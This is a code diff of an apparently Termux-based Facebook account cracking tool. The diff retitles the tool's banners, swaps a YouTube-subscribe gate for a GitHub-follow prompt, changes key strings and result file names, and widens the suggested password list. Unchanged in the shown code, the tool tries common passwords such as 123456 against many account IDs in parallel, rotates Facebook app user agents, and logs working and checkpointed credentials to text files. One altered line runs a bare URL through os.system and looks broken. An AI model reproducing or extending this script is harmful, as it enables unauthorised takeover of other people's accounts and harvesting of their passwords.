@@ -85,8 +85,8 @@ def back():
 	login()
 
 TONMOY="TONMOY-"
-imt="-Busra4786=="
-ak="Lover-"
+imt="-tkm407=="
+ak="TM-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrTONMOY-cov', 'r').read()
@@ -124,10 +124,10 @@ logo = ("""\033[1;32m
 \033[1;37m   ██    ██    ██ ██  ██ ██\033[1;32m ██  ██  ██ ██    ██    ██    
 \033[1;37m   ██     ██████  ██   ████\033[1;32m ██      ██  ██████     ██    
 \033[1;37m ══════════════════════════════════════════════════
-\033[1;37m║ AUTHOR        : \033[1;32mTONMOY MAHATO                                                          ║
-\033[1;37m║ GITHUB          : \033[1;32mtonmoy404-cyber                                                             ║
-\033[1;37m║ YOU TUBE     : \033[1;32mTONMOY MAHATO                                                          ║
-\033[1;37m║ TOOL              : \033[1;32mFILE CRACK                                                                        ║
+\033[1;37m AUTHOR        : \033[1;32mTONMOY MAHATO                                                          
+\033[1;37m GITHUB          : \033[1;32mtonmoy404-cyber                                                             
+\033[1;37m YOU TUBE     : \033[1;32mTONMOY MAHATO                                                          
+\033[1;37m TOOL              : \033[1;32m OLD CLONING                                                                       
 \033[1;37m ══════════════════════════════════════════════════""")
 
 class Main:
@@ -139,33 +139,28 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;37m     Youtube Channel  No Subscribe No Approved")
 		print("")
-		print("\033[1;32m [1] First Subscribe My Youtube Channel")
-		print("\033[1;33m [2] Exit")
+		print("\033[1;31m [1] \033[1;37mFirst Follow my \033[1;32mGitHub Account")
+		print("\033[1;31m [2] \033[1;37mEx\033[1;32mit")
 		print("")
-		Baloch = input("\n\033[1;31m  Chose ==> \033[1;32m")
+		Baloch = input("\n\033[1;37m  Cho\033[1;32mse--> \033[1;32m")
 		if Baloch in ["", " "]:
 			exit()
 		elif Baloch in ["2", "02"]:
 			print("    Thanks")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://youtube.com/c/TONMOYTechnologychannel")
+			os.system("https://github.com/tonmoy404-cyber")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;33m    Type Your Youtube Gmail : ")
-			print("")
-			input("\n\033[1;32m  Type Name ==> \033[1;36m")
-			time.sleep(2.1)
 			print("")
 			print("\033[1;32m Successful Bro")
 			time.sleep(2.0)
 			os.system("clear")
 		print(logo)
-		print("\n [1] start Cloning")
+		print("\n [\033[1;31m1] \033[1;37mSTART \033[1;32mCLEANING")
 		print(" [E] Exit \n")
-		TONMOY =input(" Choose : ")
+		TONMOY =input("\033[1;37mCho\033[1;32mose --> ")
 		
 		if TONMOY in ["1", "01"]:
 			self.old()
@@ -190,19 +185,19 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				print("\n\033[1;32m [!] USE (123456-1234567-123456789) FOR IDZ\033[1;37m ")
+				listpass = input("%s [?] \033[1;37mENTER \033[1;32mPASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] \033[1;37mPASSWORD MINIMUM \033[1;32m6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				print("\n%s [+] \033[1;37mOK RESULTS \033[1;32mSAVED IN -> ok.txt"%(Y))
+				print("%s [+] \033[1;37mCP RESULTS \033[1;32mSAVED IN -> cp.txt"%(G))
+				print("%s [!] \033[1;37mIF NO RESULT USE AIRPLANE MODE \033[1;32m5 SECONDS\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [>>] CRACK COMPLETE...")
+			exit("\n\n [>>] \033[1;37mCRACK \033[1;32mCOMPLETE...")
 		except Exception as e:exit(str(e))
 
 	def api(self, uid, pwx):
@@ -571,7 +566,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ TONMOY ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r \033[1;34m[ TONMOY ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -591,12 +586,12 @@ class Main:
 				print("\r \033[0;92m[ TONMOY-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-TONMOY-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2011-TONMOY-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ TONMOY-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-TONMOY-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2011-TONMOY-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
